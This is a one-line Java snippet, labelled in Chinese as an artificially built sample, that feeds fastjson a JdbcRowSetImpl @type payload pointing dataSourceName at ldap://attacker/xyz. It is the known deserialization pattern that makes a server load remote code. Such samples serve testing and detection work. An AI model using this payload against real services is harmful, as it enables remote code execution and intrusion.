// 出处:人工构造(依据 fastjson 载荷内联类型描述符形态)
Object o = JSON.parseObject("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/xyz\",\"autoCommit\":true}");
